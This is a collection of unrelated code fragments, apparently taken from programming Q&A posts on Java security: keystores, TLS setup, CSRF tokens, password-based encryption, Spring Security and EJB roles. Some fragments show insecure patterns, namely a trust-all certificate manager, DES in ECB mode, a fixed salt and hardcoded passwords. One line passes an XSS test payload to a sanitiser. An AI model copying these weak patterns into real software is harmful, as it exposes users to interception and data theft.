      <rule> <!-- allow anything signed with company's public cert --> 
        <id location="http://10.190.65.254/myapp">
        </id>
        <action permission="run"/>
      </rule>
     <rule>
       <id />
        <action permission="default"/>
      </rule>
    </ruleset> 
---UNIQUEIDFORSNIP---|119467861|    C:\Windows\Sun\Java\Deployment
---UNIQUEIDFORSNIP---|119560438|    $in = 'abcdef12345';
    $salt = 'test1';
    $out = hash('sha256', $in.$salt,true); //3rd parameter says return raw result
    echo 'Calculated: ' . base64_encode($out);
---UNIQUEIDFORSNIP---|119561515|     buildTypes {
            debug {
                buildConfigField "String", "SERVER_URL", "\"http:TempRequest\""
            }
            release {
                buildConfigField "String", "SERVER_URL", "\"http:TempRequest\""
                minifyEnabled false
                proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'
            }
        }
---UNIQUEIDFORSNIP---|119561518|    String url = BuildConfig.SERVER_URL + "endpoint";
---UNIQUEIDFORSNIP---|119585316|    <Context useHttpOnly="true">
    ...
    </Context>
---UNIQUEIDFORSNIP---|119664349|    Set<String> tokens = new HashSet<String>();
    event.getSession().setAttribute("tokens", tokens);
---UNIQUEIDFORSNIP---|119664351|    String token = UUID.randomUUID().toString();
    Set<String> tokens = (Set<String>) request.getSession().getAttribute("tokens");
    tokens.add(token);
    request.setAttribute("token", token);
---UNIQUEIDFORSNIP---|119664358|    <input type="hidden" name="token" value="${token}" />
---UNIQUEIDFORSNIP---|119664363|    String token = request.getParameter("token");
    Set<String> tokens = (Set<String>) request.getSession().getAttribute("tokens");
    
    if (!tokens.remove(token)) {
        response.sendError(HttpServletResponse.SC_BAD_REQUEST);
        return;
    }
    // ...    
---UNIQUEIDFORSNIP---|119862299|javax.xml.bind.DatatypeConverter.printHexBinary(byte[] array)
---UNIQUEIDFORSNIP---|119881368|		String toVerify = "A1005056807CE11EE2B4CE0025305725CFrCN%3DKED,OU%3DI0020266601,OU%3DSAPWebAS,O%3DSAPTrustCommunity,C%3DDE20130611102236";
		String signed = "MIIBUQYJKoZIhvcNAQcCoIIBQjCCAT4CAQExCzAJBgUrDgMCGgUAMAsGCSqGSIb3DQEHATGCAR0wggEZAgEBMG8wZDELMAkGA1UEBhMCREUxHDAaBgNVBAoTE1NBUCBUcnVzdCBDb21tdW5pdHkxEzARBgNVBAsTClNBUCBXZWIgQVMxFDASBgNVBAsTC0kwMDIwMjY2NjAxMQwwCgYDVQQDEwNLRUQCByASEgITMlYwCQYFKw4DAhoFAKBdMBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTEzMDYxMTA4MjM1MVowIwYJKoZIhvcNAQkEMRYEFGy7jXb/pUqMYdk2dss2Qe6hNroaMAkGByqGSM44BAMELjAsAhRMJ+t5/3RxQAsHKnIoPY4BnO0qCAIUAbKRwWNjOYsewB56zoZqnZwRyWw=";
		byte[] signedByte = Base64.decode(signed);
		Security.addProvider(new BouncyCastleProvider());
		CMSSignedData s = new CMSSignedData(new CMSProcessableByteArray(toVerify.getBytes()), signedByte);
		SignerInformationStore signers = s.getSignerInfos();
		SignerInformation signerInfo = (SignerInformation)signers.getSigners().iterator().next();
				
		FileInputStream fis = new FileInputStream("c:\\sap.cer");
		CertificateFactory cf = CertificateFactory.getInstance("X.509");
		X509Certificate cert = (X509Certificate)cf.generateCertificates(fis).iterator().next();
		
		boolean result = signerInfo.verify(new JcaSimpleSignerInfoVerifierBuilder().setProvider("SUN").build(cert.getPublicKey())); 
		System.out.println("Verified: "+result);
---UNIQUEIDFORSNIP---|120174235|    import java.io.IOException;
    import java.io.UnsupportedEncodingException;
    import java.security.AlgorithmParameters;
    import java.security.GeneralSecurityException;
    import java.security.NoSuchAlgorithmException;
    import java.security.spec.InvalidKeySpecException;
    import java.util.Base64;
    import javax.crypto.Cipher;
    import javax.crypto.SecretKey;
    import javax.crypto.SecretKeyFactory;
    import javax.crypto.spec.IvParameterSpec;
    import javax.crypto.spec.PBEKeySpec;
    import javax.crypto.spec.SecretKeySpec;
    
    public class ProtectedConfigFile {
    
        public static void main(String[] args) throws Exception {
            String password = System.getProperty("password");
            if (password == null) {
                throw new IllegalArgumentException("Run with -Dpassword=<password>");
            }
    
            // The salt (probably) can be stored along with the encrypted data
            byte[] salt = new String("12345678").getBytes();
    
            // Decreasing this speeds down startup time and can be useful during testing, but it also makes it easier for brute force attackers
            int iterationCount = 40000;
            // Other values give me java.security.InvalidKeyException: Illegal key size or default parameters
            int keyLength = 128;
            SecretKeySpec key = createSecretKey(password.toCharArray(),
                    salt, iterationCount, keyLength);
    
            String originalPassword = "secret";
            System.out.println("Original password: " + originalPassword);
            String encryptedPassword = encrypt(originalPassword, key);
            System.out.println("Encrypted password: " + encryptedPassword);
            String decryptedPassword = decrypt(encryptedPassword, key);
            System.out.println("Decrypted password: " + decryptedPassword);
        }
    
        private static SecretKeySpec createSecretKey(char[] password, byte[] salt, int iterationCount, int keyLength) throws NoSuchAlgorithmException, InvalidKeySpecException {
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA512");
            PBEKeySpec keySpec = new PBEKeySpec(password, salt, iterationCount, keyLength);
            SecretKey keyTmp = keyFactory.generateSecret(keySpec);
            return new SecretKeySpec(keyTmp.getEncoded(), "AES");
        }
    
        private static String encrypt(String property, SecretKeySpec key) throws GeneralSecurityException, UnsupportedEncodingException {
            Cipher pbeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            pbeCipher.init(Cipher.ENCRYPT_MODE, key);
            AlgorithmParameters parameters = pbeCipher.getParameters();
            IvParameterSpec ivParameterSpec = parameters.getParameterSpec(IvParameterSpec.class);
            byte[] cryptoText = pbeCipher.doFinal(property.getBytes("UTF-8"));
            byte[] iv = ivParameterSpec.getIV();
            return base64Encode(iv) + ":" + base64Encode(cryptoText);
        }
    
        private static String base64Encode(byte[] bytes) {
            return Base64.getEncoder().encodeToString(bytes);
        }
    
        private static String decrypt(String string, SecretKeySpec key) throws GeneralSecurityException, IOException {
            String iv = string.split(":")[0];
            String property = string.split(":")[1];
            Cipher pbeCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            pbeCipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(base64Decode(iv)));
            return new String(pbeCipher.doFinal(base64Decode(property)), "UTF-8");
        }
    
        private static byte[] base64Decode(String property) throws IOException {
            return Base64.getDecoder().decode(property);
        }
    }
---UNIQUEIDFORSNIP---|120437838|    algorithms.put("MD2WITHRSAENCRYPTION", PKCSObjectIdentifiers.md2WithRSAEncryption);
    algorithms.put("MD2WITHRSA", PKCSObjectIdentifiers.md2WithRSAEncryption);
    algorithms.put("MD5WITHRSAENCRYPTION", PKCSObjectIdentifiers.md5WithRSAEncryption);
    algorithms.put("MD5WITHRSA", PKCSObjectIdentifiers.md5WithRSAEncryption);
    algorithms.put("SHA1WITHRSAENCRYPTION", PKCSObjectIdentifiers.sha1WithRSAEncryption);
    algorithms.put("SHA1WITHRSA", PKCSObjectIdentifiers.sha1WithRSAEncryption);
    algorithms.put("SHA224WITHRSAENCRYPTION", PKCSObjectIdentifiers.sha224WithRSAEncryption);
    algorithms.put("SHA224WITHRSA", PKCSObjectIdentifiers.sha224WithRSAEncryption);
    algorithms.put("SHA256WITHRSAENCRYPTION", PKCSObjectIdentifiers.sha256WithRSAEncryption);
    algorithms.put("SHA256WITHRSA", PKCSObjectIdentifiers.sha256WithRSAEncryption);
    algorithms.put("SHA384WITHRSAENCRYPTION", PKCSObjectIdentifiers.sha384WithRSAEncryption);
    algorithms.put("SHA384WITHRSA", PKCSObjectIdentifiers.sha384WithRSAEncryption);
    algorithms.put("SHA512WITHRSAENCRYPTION", PKCSObjectIdentifiers.sha512WithRSAEncryption);
    algorithms.put("SHA512WITHRSA", PKCSObjectIdentifiers.sha512WithRSAEncryption);
    algorithms.put("SHA1WITHRSAANDMGF1", PKCSObjectIdentifiers.id_RSASSA_PSS);
    algorithms.put("SHA224WITHRSAANDMGF1", PKCSObjectIdentifiers.id_RSASSA_PSS);
    algorithms.put("SHA256WITHRSAANDMGF1", PKCSObjectIdentifiers.id_RSASSA_PSS);
    algorithms.put("SHA384WITHRSAANDMGF1", PKCSObjectIdentifiers.id_RSASSA_PSS);
    algorithms.put("SHA512WITHRSAANDMGF1", PKCSObjectIdentifiers.id_RSASSA_PSS);
    algorithms.put("RIPEMD160WITHRSAENCRYPTION", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd160);
    algorithms.put("RIPEMD160WITHRSA", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd160);
    algorithms.put("RIPEMD128WITHRSAENCRYPTION", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd128);
    algorithms.put("RIPEMD128WITHRSA", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd128);
    algorithms.put("RIPEMD256WITHRSAENCRYPTION", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd256);
    algorithms.put("RIPEMD256WITHRSA", TeleTrusTObjectIdentifiers.rsaSignatureWithripemd256);
    algorithms.put("SHA1WITHDSA", X9ObjectIdentifiers.id_dsa_with_sha1);
    algorithms.put("DSAWITHSHA1", X9ObjectIdentifiers.id_dsa_with_sha1);
    algorithms.put("SHA224WITHDSA", NISTObjectIdentifiers.dsa_with_sha224);
    algorithms.put("SHA256WITHDSA", NISTObjectIdentifiers.dsa_with_sha256);
    algorithms.put("SHA384WITHDSA", NISTObjectIdentifiers.dsa_with_sha384);
    algorithms.put("SHA512WITHDSA", NISTObjectIdentifiers.dsa_with_sha512);
    algorithms.put("SHA1WITHECDSA", X9ObjectIdentifiers.ecdsa_with_SHA1);
    algorithms.put("ECDSAWITHSHA1", X9ObjectIdentifiers.ecdsa_with_SHA1);
    algorithms.put("SHA224WITHECDSA", X9ObjectIdentifiers.ecdsa_with_SHA224);
    algorithms.put("SHA256WITHECDSA", X9ObjectIdentifiers.ecdsa_with_SHA256);
    algorithms.put("SHA384WITHECDSA", X9ObjectIdentifiers.ecdsa_with_SHA384);
    algorithms.put("SHA512WITHECDSA", X9ObjectIdentifiers.ecdsa_with_SHA512);
    algorithms.put("GOST3411WITHGOST3410", CryptoProObjectIdentifiers.gostR3411_94_with_gostR3410_94);
    algorithms.put("GOST3411WITHGOST3410-94", CryptoProObjectIdentifiers.gostR3411_94_with_gostR3410_94);
    algorithms.put("GOST3411WITHECGOST3410", CryptoProObjectIdentifiers.gostR3411_94_with_gostR3410_2001);
    algorithms.put("GOST3411WITHECGOST3410-2001", CryptoProObjectIdentifiers.gostR3411_94_with_gostR3410_2001);
    algorithms.put("GOST3411WITHGOST3410-2001", CryptoProObjectIdentifiers.gostR3411_94_with_gostR3410_2001);
---UNIQUEIDFORSNIP---|120444680|    public String getData() {
		String dataDecrypted = null;
		try {
			byte[] cryptionKeyCrypted = Base64.decode(cryptionKeyCryptedBase64, Base64.NO_WRAP);
			byte[] cryptionIV = Base64.decode(cryptionIVBase64, Base64.NO_WRAP);
			Cipher cipherRSA = Cipher.getInstance("RSA/ECB/OAEPWithSHA-1AndMGF1Padding");
            // get private key from the pair used to grab the public key to send to the api
			cipherRSA.init(Cipher.DECRYPT_MODE, rsaKeyPair.getPrivateKey());
			byte[] key = cipherRSA.doFinal(cryptionKeyCrypted);
			byte[] dataCrytped = Base64.decode(dataCryptedBase64, Base64.NO_WRAP);
			IvParameterSpec ivSpec = new IvParameterSpec(cryptionIV);
			SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
			Cipher cipherAES = Cipher.getInstance("AES/CBC/ZeroBytePadding");
			cipherAES.init(Cipher.DECRYPT_MODE, skeySpec, ivSpec);
			byte[] decryptedAESBytes = cipherAES.doFinal(dataCrytped);
			dataDecrypted = new String(decryptedAESBytes, "UTF-8");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return dataDecrypted;
	}
---UNIQUEIDFORSNIP---|120626266|    ESAPI.httpUtilities().setCurrentHTTP(req, resp);
    ESAPI.httpUtilities().sendRedirect(location);
    ESAPI.httpUtilities().clearCurrent();
---UNIQUEIDFORSNIP---|121033795|    // Create a trust manager that does not validate certificate chains
    TrustManager[] trustAllCerts = new TrustManager[]{
        new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }
            public void checkClientTrusted(
                java.security.cert.X509Certificate[] certs, String authType) {
            }
            public void checkServerTrusted(
                java.security.cert.X509Certificate[] certs, String authType) {
            }
        }
    };
    
    // Install the all-trusting trust manager
    try {
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
    } catch (Exception e) {
    }
    
    // Now you can access an https URL without having the certificate in the truststore
    try {
        URL url = new URL("https://hostname/index.html");
    } catch (MalformedURLException e) {
    }
---UNIQUEIDFORSNIP---|121119400|     byte[] salt = new byte[8];
     System.arraycopy(randomString.getBytes("UTF-8"), 0, salt, 0, 8);
---UNIQUEIDFORSNIP---|121198228|    class myclass : boost::noncopyable {
     ...
    };
---UNIQUEIDFORSNIP---|121198232|    myclass m;
    myclass m2(m); // copy construction isn't allowed
    myclass m3;
    m3 = m; // assignment also not allowed
---UNIQUEIDFORSNIP---|121464040|    20:33:07,744 DEBUG [org.springframework.security.authentication.ProviderManager] - Authentication attempt using org.springframework.security.authentication.dao.DaoAuthenticationProvider
    20:33:07,968 WARN  [org.springframework.security.authentication.event.LoggerListener] - Authentication event AuthenticationFailureServiceExceptionEvent: asdfasdfaasdf; details: org.springframework.security.web.authentication.WebAuthenticationDetails@ffff8868: RemoteIpAddress: 0:0:0:0:0:0:0:1%0; SessionId: null; exception: Could not open Hibernate Session for transaction; nested exception is org.hibernate.exception.JDBCConnectionException: Could not open connection
---UNIQUEIDFORSNIP---|121578460|    grant codeBase "file:/C:/path/to/trusted/code/classes" {
         permission java.lang.reflect.ReflectPermission "suppressAccessChecks";
    };
---UNIQUEIDFORSNIP---|121856793|    protected String getParametersAsHtmlInput(CSRFTesterModel model, int row,
      boolean isString) {
      String s = model.getParameters(row);
      String[] parts = s.split("&");
      StringBuffer sb = new StringBuffer();
      if ((s == null) || (s.length() == 0)) {
        if (isString) {
          sb.append("'<input type=\"hidden\" name=\"name\" value=\"value\"/>' \r\n");
        } else {
          sb.append("<input type=\"hidden\" name=\"name\" value=\"value\"/> \r\n");
        }
      }
      else if (parts.length == 1) {
        String[] pair = parts[0].split("=");
        if (isString) {
          sb.append("'<input type=\"hidden\" name=\"" + pair[0] 
            + "\" value=\"" + pair[1] + "\"/>' \r\n");
        } else {
          sb.append("<input type=\"hidden\" name=\"" + pair[0] 
            + "\" value=\"" + pair[1] + "\"/> \r\n");
        }
      }
      else {
        for (int i = 0; i < parts.length; i++) {
          String name = parts[i].split("=")[0];
          String value = parts[i].split("=").length == 1 ? "" : parts[i].split("=")[1];
          if (isString) {
            sb.append("'<input type=\"hidden\" name=\"" + name 
              + "\" value=\"" + value + "\"/>'");
          } else {
            sb.append("<input type=\"hidden\" name=\"" + name 
              + "\" value=\"" + value + "\"/>");
          }
          if ((i + 1 < parts.length) && (isString)) {
            sb.append(" + \r\n");
          } else {
            sb.append("\r\n");
          }
        }
      }
      return sb.toString();
    }
---UNIQUEIDFORSNIP---|122120247|    // add provider only if it's not in the JVM
    if (Security.getProvider(BouncyCastleProvider.PROVIDER_NAME) == null) {
        Security.addProvider(new BouncyCastleProvider());
    }
---UNIQUEIDFORSNIP---|122133526|        java.security.Security.addProvider(new BouncyCastleProvider());
---UNIQUEIDFORSNIP---|122184765|    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM member WHERE member_username = ? AND member_password = ?");
    stmt.setString(1, username);
    stmt.setString(2, password);
    stmt.execute();
    
    ResultSet rs = stmt.getResultSet();
    // ...
---UNIQUEIDFORSNIP---|122854296|    //Generate a key
    KeyGenerator KeyGen = KeyGenerator.getInstance("AES");
    KeyGen.init(128);
    SecretKey Key = KeyGen.generateKey();
    //Generate init vector
    SecureRandom rng = SecureRandom.getInstance("SHA1PRNG");
    byte [] IV = new byte[16];
    rng.nextBytes(IV);
    //Initialize the encryptor
    Cipher ci = Cipher.getInstance("AES/CBC/NoPadding"); //The spec might be different!
    ci.init(Cipher.ENCRYPT_MODE, Key, new IvParameterSpec(IV));
---UNIQUEIDFORSNIP---|123017914|    KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
	try {
	FileInputStream fis = ctx.getApplicationContext().openFileInput("bs.keystore");
	ks.load(fis, ksPassword);
	} catch(FileNotFoundException e) {
		ks.load(null, ksPassword);
	}
---UNIQUEIDFORSNIP---|123163461|	public class TaskList {
	
		private SystemUser owner;
		private List<Task> tasks = new ArrayList<>();
		
		public TastList(SystemUser owner) {
			this.owner = owner;
		}
		
		public void Add(Task task) {
			Guard.allowFor(owner); 
			tasks.add(task);
		}
	}
---UNIQUEIDFORSNIP---|123190092|    @Component
    public class SpringSessionClientHttpRequestInterceptor implements ClientHttpRequestInterceptor {
    @Override
    public ClientHttpResponse intercept(HttpRequest request, byte[] body, ClientHttpRequestExecution execution)
        throws IOException {
        
        request.getHeaders().add("Cookie", "SESSION=" + sessionId);
        return execution.execute(request, body);
    }
---UNIQUEIDFORSNIP---|123190098|    @Bean
	public RestTemplate restTemplate(){
		RestTemplate rest = new RestTemplate();
		ClientHttpRequestInterceptor interceptor= new SpringSessionClientHttpRequestInterceptor();
		List<ClientHttpRequestInterceptor> interceptors = new ArrayList<ClientHttpRequestInterceptor>();
        interceptors.add(interceptor);
        rest.setInterceptors(interceptors);  
        return rest;
	}
---UNIQUEIDFORSNIP---|123470685|    import java.io.FileOutputStream;
    import java.security.KeyStore;
    import java.security.cert.X509Certificate;
    
    ....
    
    X509Certificate cert = // your certificate...
    // generate a keystore instance
    KeyStore ks = KeyStore.getInstance("PKCS12");
    // save your cert inside the keystore
    ks.setCertificateEntry("YourCertAlias", cert);
    // create the outputstream to store the keystore
    FileOutputStream fos = new FileOutputStream("/your_path/keystore.pfx");
    // store the keystore protected with password
    ks.store(fos, "yourPassword".toCharArray());
    
    ....
---UNIQUEIDFORSNIP---|123481153|    @Autowired
    private WebApplicationContext context;
    
    @Autowired
    private Filter springSecurityFilterChain;
    
    @Before
    public void setup() {
    	mockMvc = MockMvcBuilders.webAppContextSetup(context)
    			.addFilters(springSecurityFilterChain).build();
    }
---UNIQUEIDFORSNIP---|123605059|    file = new FileOutputStream(privateKeyFile);
---UNIQUEIDFORSNIP---|123605063|     keyStore.load(new FileInputStream(privateKeyFile), Constants.JKS_PRIVATE_FILE_PASSWORD);
---UNIQUEIDFORSNIP---|123787045|    import java.io.*;
    class LimitOutputStream extends FilterOutputStream{
    
        private long limit;
    
        public LimitOutputStream(OutputStream out,long limit){
            super(out);
            this.limit = limit;
        }
    
        public void write(byte[]b) throws IOException{ 
            long left = Math.min(b.length,limit);
            if (left<=0)
                return;
            limit-=left;
            out.write(b, 0, (int)left);
        }
    
        public void write(int b) throws IOException{
            if (limit<=0)
                return;
            limit--;
            out.write(b);
        }
    
        public void write(byte[]b,int off, int len) throws IOException{
            long left = Math.min(len,limit);
            if (left<=0)
                return;
            limit-=left;
            out.write(b,off,(int)left);
        }  
    }
---UNIQUEIDFORSNIP---|123954950|    MessageDigest md = MessageDigest.getInstance("SHA-1");
---UNIQUEIDFORSNIP---|123954953|    MessageDigest md = MessageDigest.getInstance("MD5");
---UNIQUEIDFORSNIP---|124026657|    <Set name="ExcludeProtocols">
        <Array type="java.lang.String">             
           <Item>SSLv3</Item>
        </Array>
    </Set>
---UNIQUEIDFORSNIP---|124320477|    import zipfile
    z = zipfile.ZipFile('c:/a_zip_file')
    print 'total files size=', sum(e.file_size for e in z.infolist())
    z.close()
---UNIQUEIDFORSNIP---|124335800|    	    KeyStore clientTrustedKeyStore = KeyStore.getInstance(KeyStore.getDefaultType());
	        clientTrustedKeyStore.load(null, "password".toCharArray());
	        KeyStore.Entry entry = new KeyStore.TrustedCertificateEntry(cert);
	        clientTrustedKeyStore.setEntry("alias", entry, null);
---UNIQUEIDFORSNIP---|124335804|    	tmf = TrustManagerFactory.getInstance("SunX509");
		kmf = KeyManagerFactory.getInstance("SunX509");
		tmf.init(trustKeyStore);
		kmf.init(keyStore, password);
			
		// create, init SSLContext
    		SSLContext sslCtx = SSLContext.getInstance("TLS");
    		sslCtx.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
---UNIQUEIDFORSNIP---|124335810|    sslSocket.setNeedClientAuth(boolean);
---UNIQUEIDFORSNIP---|124335814|    ks.setCertificateEntry(alias,cert);
---UNIQUEIDFORSNIP---|124335817|    ks.setKeyEntry(alias,keyPair.getPrivate(),keyStorePassword,certChain);
---UNIQUEIDFORSNIP---|124335819|    Certificate[] certChain = {myCert};
---UNIQUEIDFORSNIP---|124375580|    http.authorizeRequests().antMatchers(HttpMethod.OPTIONS, "/**").permitAll(); 
---UNIQUEIDFORSNIP---|124386125|        <login-config>
            <auth-method>CLIENT-CERT</auth-method>
        </login-config>
---UNIQUEIDFORSNIP---|124520767|    protected Authentication attemptSwitchUser(HttpServletRequest request) {
        Authentication switchTo = super.attemptSwitchUser(request);
        Authentication currentUser = SecurityContextHolder.getContext().getAuthentication();
        // Inspect currentUser (e.g. authorities) and switchTo to see if valid combination
        // Raise AuthenticationException if not
        return switchTo;
    }
---UNIQUEIDFORSNIP---|124535597|    public static void main (String[] args){
      HttpClient httpclient = new DefaultHttpClient();
      // Note that the specified port 443 corresponds with the SSL service
      ((AbstractHttpClient) httpclient).getCredentialsProvider().setCredentials(
    new AuthScope("www.moneytrackin.com", 443),
    new UsernamePasswordCredentials("user", "password"));
      // Https page to access
      HttpGet httpget = new HttpGet("https://www.moneytrackin.com/api/rest/getBalance");
      HttpResponse response;
      try {
          response = httpclient.execute(httpget);
          System.out.println("State: "+response.getStatusLine().toString());
          HttpEntity entity = response.getEntity();
          if (entity != null) {
              InputStream instream = entity.getContent();
              String result= convertStreamToString(instream);
              System.out.println("Data: "+result);
              instream.close();
          }
      } catch (ClientProtocolException e) {
          // TODO Auto-generated catch block
          e.printStackTrace();
      } catch (IOException e) {
          // TODO Auto-generated catch block
          e.printStackTrace();
      }
---UNIQUEIDFORSNIP---|124586458|    FileOutputStream out = new FileOutputStream(new File(Constants.JKS_PRIVATE_FILE_NAME), true);
---UNIQUEIDFORSNIP---|124586460|    FileOutputStream out = new FileOutputStream(getFile2(Constants.JKS_PRIVATE_FILE_NAME));
---UNIQUEIDFORSNIP---|124586462|    keyStore.store(out, pass);
---UNIQUEIDFORSNIP---|124586464|    keyStore.store(out, Constants.JKS_PRIVATE_FILE_PASSWORD);
---UNIQUEIDFORSNIP---|124647591|    SSLContext sslContext = SSLContexts.custom()
            .useTLS() // Only this turned out to be not enough
            .build();
    SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(
            sslContext,
            new String[] {"TLSv1", "TLSv1.1", "TLSv1.2"},
            null,
            SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);
    CloseableHttpClient client = HttpClients.custom()
            .setSSLSocketFactory(sf)
            .build();
---UNIQUEIDFORSNIP---|124969900|    140535757866656:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:337:
---UNIQUEIDFORSNIP---|125416026|    CATALINA_HOME/bin/digest.[bat|sh] -a {algorithm} {cleartext-password}
---UNIQUEIDFORSNIP---|125416030|    CATALINA_HOME/bin/digest.[bat|sh] -a {algorithm} {username}:{realm}:{cleartext-password}
---UNIQUEIDFORSNIP---|125461868|    public interface ObjectRepository<T extends DomainObject>
    {
        public T save(T object);
        ...
    }
---UNIQUEIDFORSNIP---|125461870|    @Local
    public interface TaskServiceBeanLocal extends ObjectRepository<Task>
    {
    }
---UNIQUEIDFORSNIP---|125461876|    @Stateless
    @LocalBinding(jndiBinding = TaskServiceBean.LOOKUP_STRING)
    @SecurityDomain(value = Security.DOMAIN)
    @DeclareRoles({ Roles.ADMIN, Roles.CLERK, Roles.READ_ONLY })
    //By default, allow no one access, we'll enable access at the method level
    @RolesAllowed({})
    public class TaskServiceBean implements TaskServiceBeanLocal
    {
        public static final String LOOKUP_STRING = "TaskServiceBean/local";
        @RolesAllowed({ Roles.ADMIN, Roles.CLERK })
        @TransactionAttribute(TransactionAttributeType.REQUIRED)
        @Override
        public Task save(Task task)
        {
            ...
        }
    }
---UNIQUEIDFORSNIP---|125461883|    TRACE [org.jboss.security.authorization.modules.ejb.EJBPolicyModuleDelegate] Exception:Insufficient method permissions, principal=myuser, ejbName=SecureServiceBean, method=save, interface=Local, requiredRoles=Roles(), principalRoles=Roles(Admin,)
---UNIQUEIDFORSNIP---|125461892|    @Local
    public interface TaskServiceBeanLocal extends ObjectRepository<Task>
    {
        public void test();
    }
    //and implement the test() method, having the same permission as the save() method.
    public class TaskServiceBean implements TaskServiceBeanLocal
    {
        @RolesAllowed({ Roles.ADMIN, Roles.CLERK })
        @TransactionAttribute(TransactionAttributeType.REQUIRED)
        @Override
        public Task save(Task task)
        {
            ...
        }
        @RolesAllowed({ Roles.ADMIN, Roles.CLERK })
        @TransactionAttribute(TransactionAttributeType.REQUIRED)
        @Override
        public void test()
        {
            System.out.println("hello");
        }
    }
---UNIQUEIDFORSNIP---|125461898|    @Local
    public interface TaskServiceBeanLocal extends ObjectRepository<Task>
    {
        public Task save(Task object);
        public void test();
    }
---UNIQUEIDFORSNIP---|125461903|    13:44:35,399 TRACE [org.jboss.security.authorization.modules.ejb.EJBPolicyModuleDelegate] method=public au.com.infomedix.harvey.humantask.domain.Task au.com.infomedix.harvey.ejb.TaskServiceBean.save(au.com.infomedix.harvey.humantask.domain.Task), interface=Local, requiredRoles=Roles(Clerk,Admin,)
---UNIQUEIDFORSNIP---|125503513|    public class CipherClient
    {
        public static void main(String[] args) throws Exception 
        {
        	// -Generate a DES key.
            KeyGenerator generator = KeyGenerator.getInstance("DES");
            generator.init(new SecureRandom());
            Key key = generator.generateKey();
    
            // -Store it in a file.
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("KeyFile.xx"));
            out.writeObject(key);
            out.close();
            
            String message = "The quick brown fox jumps over the lazy dog.";
            System.out.println("Message converted from Bytes = " + new String(message.getBytes()));
            System.out.println("Length = " + message.getBytes().length);
            
            String host = "localhost";
            int port = 7999;
            Socket s = new Socket(host, port);
    
            // -Use the key to encrypt the message above and send it over socket s to the server.   
            Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key);
            CipherOutputStream cipherOut = new CipherOutputStream(s.getOutputStream(), cipher);
            cipherOut.write(message.getBytes());
            cipherOut.close();
            s.close();
        }
    }
---UNIQUEIDFORSNIP---|125503515|    public class CipherServer
    {
        public static void main(String[] args) throws Exception 
        {
            int port = 7999;
            ServerSocket server = new ServerSocket(port);
            Socket s = server.accept();
    
            // -Read the key from the file generated by the client.
            ObjectInputStream in = new ObjectInputStream(new FileInputStream("KeyFile.xx"));
            Key key = (Key)in.readObject();
            in.close();
    
            // -Use the key to decrypt the incoming message from socket s.      
            Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key);
            CipherInputStream cipherIn = new CipherInputStream(s.getInputStream(), cipher);
    
            byte[] array = new byte[44];
            cipherIn.read(array);
            cipherIn.close();
            s.close();
            String message = new String(array);
            System.out.println(message);
        }
    }
---UNIQUEIDFORSNIP---|125541890|    try {
        byte[] hash = getHash(tohash);
        System.arraycopy(hash, 0, data, 0, 15);
    } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }
---UNIQUEIDFORSNIP---|125541894|    System.arraycopy(hash, 0, data, 5, 10);
---UNIQUEIDFORSNIP---|125629648|    $http.post(url, {withCredentials: true, ...})
---UNIQUEIDFORSNIP---|125629650|    <form method="post" action="http://www.example.com:8080/user/delete">
---UNIQUEIDFORSNIP---|125657936|    SignedInfo si = fac.newSignedInfo
                          (fac.newCanonicalizationMethod
                            (CanonicalizationMethod.INCLUSIVE_WITH_COMMENTS,
                              (C14NMethodParameterSpec) null),
                            fac.newSignatureMethod(SignatureMethod.RSA_SHA1, null),
                            Collections.singletonList(ref)); 
---UNIQUEIDFORSNIP---|125806920|		text = "<span style=\"width: expression(alert('XSS'));\">";
		System.out.println(Jsoup.clean(text, org.jsoup.safety.Whitelist.relaxed().addTags("span").addAttributes(":all","style")));
---UNIQUEIDFORSNIP---|125920989|    public class SafeHttpHeaderReader
    {	
    	public static final int MAX_READ = 8*1024;
    	private InputStream stream;
    	private int bytesRead;
    	
    	public SafeHttpHeaderReader(InputStream stream)
    	{
    		this.stream = stream;
    		bytesRead = 0;
    	}
    	
    	public boolean hasReachedMax()
    	{
    		return bytesRead >= MAX_READ;
    	}
    	
    	public String readLine() throws IOException, Http400Exception
    	{
    		String s = "";
    		
    		while(bytesRead < MAX_READ)
    		{
    			String n = read();
    			
    			if(n.equals( "" ))
    				break;
    			
    			if(n.equals( "\r" ))
    			{
    				if(read().equals( "\n" ))
    					break;
    				
    				throw new Http400Exception();
    			}
    			s += n;
    		}
    		
    		return s;
    	}
    	
    	private String read() throws IOException
    	{
    		byte b = readByte();
    		
    		if(b == -1)
    			return "";
    		
    		return new String( new byte[]{b} , "ASCII");
    	}
    	
    	private byte readByte() throws IOException
    	{
    		byte b = (byte) stream.read();
    		bytesRead ++;
    		return b;
    	}
    }
---UNIQUEIDFORSNIP---|125959084|    java.net.ConnectException: Connection refused: connect
